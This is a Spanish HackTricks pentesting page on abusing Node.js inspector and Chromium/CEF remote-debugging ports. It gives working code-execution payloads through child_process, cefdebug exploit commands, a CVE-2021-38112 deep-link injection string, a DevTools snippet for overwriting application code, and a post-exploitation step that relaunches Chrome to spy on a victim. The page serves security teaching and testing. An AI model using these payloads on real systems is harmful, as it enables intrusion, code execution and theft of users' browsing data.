# Abuso del depurador Node inspector/CEF

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información Básica

[Desde la documentación](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Cuando se inicia con el interruptor `--inspect`, un proceso de Node.js escucha a un cliente de depuración. Por **defecto**, escuchará en el host y puerto **`127.0.0.1:9229`**. A cada proceso también se le asigna un **UUID** **único**.

Los clientes del inspector deben conocer y especificar la dirección del host, el puerto y el UUID para conectarse. Una URL completa se verá algo así como `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Dado que el **depurador tiene acceso completo al entorno de ejecución de Node.js**, un actor malicioso capaz de conectarse a este puerto puede ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).
{% endhint %}

Hay varias formas de iniciar un inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Cuando inicias un proceso inspeccionado, algo como esto aparecerá:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Los procesos basados en **CEF** (**Chromium Embedded Framework**) como necesitan usar el parámetro: `--remote-debugging-port=9222` para abrir el **depurador** (las protecciones SSRF siguen siendo muy similares). Sin embargo, en lugar de conceder una sesión de **depuración** de **NodeJS**, se comunicarán con el navegador utilizando el [**Protocolo de Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/), esta es una interfaz para controlar el navegador, pero no hay una RCE directa.

Cuando inicies un navegador depurado, algo como esto aparecerá:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navegadores, WebSockets y política de misma origen <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador web pueden realizar solicitudes WebSocket y HTTP bajo el modelo de seguridad del navegador. Una **conexión HTTP inicial** es necesaria para **obtener un identificador de sesión de depuración único**. La **política de misma origen** **evita** que los sitios web puedan realizar **esta conexión HTTP**. Para una seguridad adicional contra [**ataques de reenvío de DNS**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js verifica que los encabezados de **'Host'** para la conexión especifiquen una **dirección IP** o **`localhost`** o **`localhost6`** con precisión.

{% hint style="info" %}
Estas **medidas de seguridad evitan explotar el inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo cual podría hacerse explotando una vulnerabilidad SSRF).
{% endhint %}

### Iniciando el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso nodejs en ejecución para que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas tener suficientes privilegios, por lo que esto podría otorgarte **acceso privilegiado a la información dentro del proceso** pero no una escalada directa de privilegios.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Esto es útil en contenedores porque **detener el proceso y comenzar uno nuevo** con `--inspect` no es una **opción** ya que el **contenedor** será **detenido** con el proceso.
{% endhint %}

### Conectar al inspector/debugger

Para conectarse a un **navegador basado en Chromium**, se pueden acceder a las URL `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón de Configurar, se debe asegurar que el **host y puerto objetivo** estén listados correctamente. La imagen muestra un ejemplo de Ejecución Remota de Código (RCE):

![](<../../.gitbook/assets/image (674).png>)

Usando la **línea de comandos** puedes conectarte a un debugger/inspector con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), permite **encontrar inspectores** que se estén ejecutando localmente e **inyectar código** en ellos.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Ten en cuenta que los exploits de **RCE de NodeJS no funcionarán** si estás conectado a un navegador a través del [**Protocolo de Chrome DevTools**](https://chromedevtools.github.io/devtools-protocol/) (debes revisar la API para encontrar cosas interesantes que hacer con ella).
{% endhint %}

## RCE en NodeJS Debugger/Inspector

{% hint style="info" %}
Si llegaste aquí buscando cómo obtener **RCE desde un XSS en Electron, por favor revisa esta página.**
{% endhint %}

Algunas formas comunes de obtener **RCE** cuando puedes **conectarte** a un **inspector** de Node es utilizando algo como (parece que esto **no funcionará en una conexión al protocolo de Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Cargas del Protocolo Chrome DevTools

Puedes revisar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
En esta sección simplemente listaré cosas interesantes que encuentre que la gente haya utilizado para explotar este protocolo.

### Inyección de Parámetros a través de Enlaces Profundos

En el [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security descubrió que una aplicación basada en CEF **registraba un URI personalizado** en el sistema (workspaces://) que recibía el URI completo y luego **lanzaba la aplicación basada en CEF** con una configuración que se construía parcialmente a partir de ese URI.

Se descubrió que los parámetros del URI eran decodificados de URL y utilizados para lanzar la aplicación básica de CEF, lo que permitía a un usuario **inyectar** la bandera **`--gpu-launcher`** en la **línea de comandos** y ejecutar cosas arbitrarias.

Entonces, una carga útil como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
### Sobrescribir archivos

Cambie la carpeta donde se van a guardar los **archivos descargados** y descargue un archivo para **sobrescribir** el **código fuente** frecuentemente utilizado de la aplicación con su **código malicioso**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### RCE y exfiltración de Webdriver

Según esta publicación: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) es posible obtener RCE y exfiltrar páginas internas desde el controlador.

### Post-Explotación

En un entorno real y **después de comprometer** una PC de usuario que utiliza un navegador basado en Chrome/Chromium, podrías lanzar un proceso de Chrome con la **depuración activada y reenviar el puerto de depuración** para poder acceder a él. De esta manera podrás **inspeccionar todo lo que la víctima hace con Chrome y robar información sensible**.

La forma sigilosa es **terminar cada proceso de Chrome** y luego llamar a algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referencias

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
